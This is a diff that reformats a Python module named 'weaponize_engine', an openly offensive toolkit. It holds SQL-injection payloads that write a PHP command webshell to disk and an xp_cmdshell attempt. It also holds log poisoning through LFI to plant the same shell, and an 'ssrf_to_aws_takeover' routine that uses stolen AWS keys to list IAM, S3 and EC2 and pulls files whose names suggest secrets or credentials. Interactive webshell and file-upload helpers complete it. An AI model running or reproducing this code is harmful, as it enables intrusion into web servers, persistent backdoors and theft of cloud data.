@@ -12,8 +12,13 @@ from tools.log_utils import get_logger
 logger = get_logger("weaponize_engine")
 
 
-def sqli_into_outfile(url: str, param: str, sess: requests.Session,
-                       timeout: float = 15.0, web_root: str = "/var/www/html") -> Dict:
+def sqli_into_outfile(
+    url: str,
+    param: str,
+    sess: requests.Session,
+    timeout: float = 15.0,
+    web_root: str = "/var/www/html",
+) -> Dict:
     result = {"success": False, "method": "sqli_outfile", "webshell_url": None, "evidence": []}
     outfile_paths = [
         web_root + "/shell.php",
@@ -27,10 +32,12 @@ def sqli_into_outfile(url: str, param: str, sess: requests.Session,
 
     outfile_payloads = [
         "' UNION SELECT '%s', '', '' INTO OUTFILE '%s' -- -",
-        "' UNION SELECT 0x%x, '', '' INTO OUTFILE '%s' -- -" % (int(php_code.encode().hex(), 16), "%s"),
-        '\"; SELECT \'%s\' INTO OUTFILE \'%s\'; --',
+        "' UNION SELECT 0x%x, '', '' INTO OUTFILE '%s' -- -"
+        % (int(php_code.encode().hex(), 16), "%s"),
+        "\"; SELECT '%s' INTO OUTFILE '%s'; --",
         "1; SELECT '%s' INTO OUTFILE '%s'; --",
-        "' UNION SELECT 1,2,3 INTO OUTFILE '%s' LINES TERMINATED BY 0x%x -- -" % ("%s", int(php_code.encode().hex(), 16)),
+        "' UNION SELECT 1,2,3 INTO OUTFILE '%s' LINES TERMINATED BY 0x%x -- -"
+        % ("%s", int(php_code.encode().hex(), 16)),
     ]
     for path in outfile_paths:
         for tmpl in outfile_payloads:
@@ -46,10 +53,13 @@ def sqli_into_outfile(url: str, param: str, sess: requests.Session,
                         if "uid=" in r2.text or "gid=" in r2.text:
                             result["success"] = True
                             result["webshell_url"] = shell_url
-                            result["evidence"].append({
-                                "path": path, "shell_url": shell_url + "?c=id",
-                                "output": r2.text[:200].strip(),
-                            })
+                            result["evidence"].append(
+                                {
+                                    "path": path,
+                                    "shell_url": shell_url + "?c=id",
+                                    "output": r2.text[:200].strip(),
+                                }
+                            )
                             result["dbms"] = "mysql"
                             return result
                     except Exception:
@@ -59,10 +69,14 @@ def sqli_into_outfile(url: str, param: str, sess: requests.Session,
                         if "uid=" in r2.text or "gid=" in r2.text:
                             result["success"] = True
                             result["webshell_url"] = shell_url
-                            result["evidence"].append({
-                                "path": path, "shell_url": shell_url,
-                                "method": "POST", "output": r2.text[:200].strip(),
-                            })
+                            result["evidence"].append(
+                                {
+                                    "path": path,
+                                    "shell_url": shell_url,
+                                    "method": "POST",
+                                    "output": r2.text[:200].strip(),
+                                }
+                            )
                             result["dbms"] = "mysql"
                             return result
                     except Exception:
@@ -78,7 +92,11 @@ def sqli_into_outfile(url: str, param: str, sess: requests.Session,
     for payload in xp_cmdshell_payloads:
         try:
             r = sess.get(url.replace(param + "=", param + "=" + payload), timeout=timeout)
-            if r.status_code == 200 and ("administrator" in r.text.lower() or "nt authority" in r.text.lower() or "uid=" in r.text.lower()):
+            if r.status_code == 200 and (
+                "administrator" in r.text.lower()
+                or "nt authority" in r.text.lower()
+                or "uid=" in r.text.lower()
+            ):
                 result["success"] = True
                 result["method"] = "xp_cmdshell"
                 result["evidence"].append({"type": "xp_cmdshell", "output": r.text[:200].strip()})
@@ -90,8 +108,9 @@ def sqli_into_outfile(url: str, param: str, sess: requests.Session,
     return result
 
 
-def deploy_webshell_lfi(url: str, param: str, sess: requests.Session,
-                         timeout: float = 15.0) -> Dict:
+def deploy_webshell_lfi(
+    url: str, param: str, sess: requests.Session, timeout: float = 15.0
+) -> Dict:
     result = {"success": False, "method": "lfi_webshell", "webshell_url": None, "evidence": []}
     php_code = '<?php $c=$_GET["c"]??$_POST["c"];system($c);?>'
     "SHELL_%s" % base64.b64encode(os.urandom(4)).decode()
@@ -105,10 +124,11 @@ def deploy_webshell_lfi(url: str, param: str, sess: requests.Session,
 
     for log_path in log_paths:
         try:
-            sess.get(url, headers={"User-Agent": php_code,
-                                     "Referer": php_code,
-                                     "Cookie": "P=" + php_code},
-                     timeout=timeout)
+            sess.get(
+                url,
+                headers={"User-Agent": php_code, "Referer": php_code, "Cookie": "P=" + php_code},
+                timeout=timeout,
+            )
         except Exception:
             continue
 
@@ -118,14 +138,18 @@ def deploy_webshell_lfi(url: str, param: str, sess: requests.Session,
             if r.status_code == 200 and "system" in r.text:
                 for cmd in ["id", "whoami", "uname -a"]:
                     try:
-                        inject_url = url.replace(param + "=",
-                            param + "=" + "/var/log/nginx/access.log&c=" + quote_plus(cmd))
+                        inject_url = url.replace(
+                            param + "=",
+                            param + "=" + "/var/log/nginx/access.log&c=" + quote_plus(cmd),
+                        )
                         r2 = sess.get(inject_url, timeout=timeout)
                         if "uid=" in r2.text or "root" in r2.text or "www-data" in r2.text:
                             result["success"] = True
                             result["webshell_url"] = url
                             result["method"] = "log_poison"
-                            result["evidence"].append({"type": "log_poison", "cmd": cmd, "output": r2.text[:200].strip()})
+                            result["evidence"].append(
+                                {"type": "log_poison", "cmd": cmd, "output": r2.text[:200].strip()}
+                            )
                             return result
                     except Exception:
                         continue
@@ -135,9 +159,9 @@ def deploy_webshell_lfi(url: str, param: str, sess: requests.Session,
     return result
 
 
-def ssrf_to_aws_takeover(access_key: str, secret_key: str,
-                          session_token: Optional[str] = None,
-                          region: str = "us-east-1") -> Dict:
+def ssrf_to_aws_takeover(
+    access_key: str, secret_key: str, session_token: Optional[str] = None, region: str = "us-east-1"
+) -> Dict:
     result: Dict[str, Any] = {"success": False, "steps": [], "access": {}}
     aws_bin = "aws"
     if os.name == "nt":
@@ -177,7 +201,9 @@ def ssrf_to_aws_takeover(access_key: str, secret_key: str,
     if ok2:
         try:
             roles = json.loads(iam_out) if iam_out.startswith("{") else []
-            result["access"]["roles_count"] = len(roles.get("Roles", [])) if isinstance(roles, dict) else 0
+            result["access"]["roles_count"] = (
+                len(roles.get("Roles", [])) if isinstance(roles, dict) else 0
+            )
             result["steps"].append({"action": "iam_list_roles", "success": True})
         except json.JSONDecodeError:
             pass
@@ -186,26 +212,38 @@ def ssrf_to_aws_takeover(access_key: str, secret_key: str,
     if ok3:
         buckets = [l.strip() for l in s3_out.strip().split("\n") if l.strip()]
         result["access"]["buckets"] = buckets
-        result["steps"].append({"action": "s3_list_buckets", "buckets": len(buckets), "success": True})
+        result["steps"].append(
+            {"action": "s3_list_buckets", "buckets": len(buckets), "success": True}
+        )
 
         for bucket_line in buckets[:5]:
             parts = bucket_line.split()
             bucket_name = parts[-1] if parts else ""
             if bucket_name:
-                ok4, obj_out = _run_aws(["s3", "ls", "s3://" + bucket_name, "--recursive", "--max-items", "20"])
+                ok4, obj_out = _run_aws(
+                    ["s3", "ls", "s3://" + bucket_name, "--recursive", "--max-items", "20"]
+                )
                 if ok4:
                     objects = [l.strip() for l in obj_out.strip().split("\n") if l.strip()]
                     result["access"].setdefault("s3_contents", {})[bucket_name] = objects[:10]
                     for obj in objects[:10]:
-                        if any(kw in obj.lower() for kw in ["secret", "key", "password", "credential", "token", "pem"]):
+                        if any(
+                            kw in obj.lower()
+                            for kw in ["secret", "key", "password", "credential", "token", "pem"]
+                        ):
                             obj_name = obj.split()[-1] if obj.split() else obj
                             try:
-                                dl = _run_aws(["s3", "cp", "s3://" + bucket_name + "/" + obj_name, "-"])
+                                dl = _run_aws(
+                                    ["s3", "cp", "s3://" + bucket_name + "/" + obj_name, "-"]
+                                )
                                 if dl[0] and dl[1]:
-                                    result["access"].setdefault("sensitive_files", []).append({
-                                        "bucket": bucket_name, "key": obj_name,
-                                        "preview": dl[1][:300],
-                                    })
+                                    result["access"].setdefault("sensitive_files", []).append(
+                                        {
+                                            "bucket": bucket_name,
+                                            "key": obj_name,
+                                            "preview": dl[1][:300],
+                                        }
+                                    )
                             except Exception:
                                 pass
 
@@ -216,15 +254,19 @@ def ssrf_to_aws_takeover(access_key: str, secret_key: str,
             instances = []
             for rsv in ec2_data.get("Reservations", []):
                 for inst in rsv.get("Instances", []):
-                    instances.append({
-                        "id": inst.get("InstanceId"),
-                        "type": inst.get("InstanceType"),
-                        "state": inst.get("State", {}).get("Name"),
-                        "public_ip": inst.get("PublicIpAddress"),
-                        "private_ip": inst.get("PrivateIpAddress"),
-                    })
+                    instances.append(
+                        {
+                            "id": inst.get("InstanceId"),
+                            "type": inst.get("InstanceType"),
+                            "state": inst.get("State", {}).get("Name"),
+                            "public_ip": inst.get("PublicIpAddress"),
+                            "private_ip": inst.get("PrivateIpAddress"),
+                        }
+                    )
             result["access"]["ec2_instances"] = instances
-            result["steps"].append({"action": "ec2_describe_instances", "count": len(instances), "success": True})
+            result["steps"].append(
+                {"action": "ec2_describe_instances", "count": len(instances), "success": True}
+            )
         except json.JSONDecodeError:
             pass
 
@@ -232,8 +274,9 @@ def ssrf_to_aws_takeover(access_key: str, secret_key: str,
     return result
 
 
-def run_command_via_webshell(webshell_url: str, cmd: str,
-                              sess: requests.Session, timeout: float = 10.0) -> Dict:
+def run_command_via_webshell(
+    webshell_url: str, cmd: str, sess: requests.Session, timeout: float = 10.0
+) -> Dict:
     result = {"success": False, "output": "", "error": None}
     try:
         r = sess.get(webshell_url, params={"c": cmd}, timeout=timeout)
@@ -252,8 +295,7 @@ def run_command_via_webshell(webshell_url: str, cmd: str,
     return result
 
 
-def interactive_webshell(webshell_url: str, sess: requests.Session,
-                          timeout: float = 5.0) -> None:
+def interactive_webshell(webshell_url: str, sess: requests.Session, timeout: float = 5.0) -> None:
     print("[*] Interactive webshell at %s" % webshell_url)
     print("[*] Type 'exit' to quit, 'upload <local> <remote>' to upload files")
     while True:
@@ -280,16 +322,17 @@ def interactive_webshell(webshell_url: str, sess: requests.Session,
             print("[!] Command failed: %s" % (r.get("error") or "no output"))
 
 
-def _upload_via_webshell(webshell_url: str, local_path: str, remote_path: str,
-                          sess: requests.Session, timeout: float) -> bool:
+def _upload_via_webshell(
+    webshell_url: str, local_path: str, remote_path: str, sess: requests.Session, timeout: float
+) -> bool:
     try:
         with open(local_path, "rb") as f:
             data = f.read()
         b64_data = base64.b64encode(data).decode()
-        cmd = 'echo %s | base64 -d > %s' % (b64_data, remote_path)
+        cmd = "echo %s | base64 -d > %s" % (b64_data, remote_path)
         r = run_command_via_webshell(webshell_url, cmd, sess, timeout)
         if r["success"]:
-            verify_cmd = 'ls -la %s' % remote_path
+            verify_cmd = "ls -la %s" % remote_path
             r2 = run_command_via_webshell(webshell_url, verify_cmd, sess, timeout)
             if r2["success"]:
                 print("[+] Uploaded %s -> %s (%d bytes)" % (local_path, remote_path, len(data)))
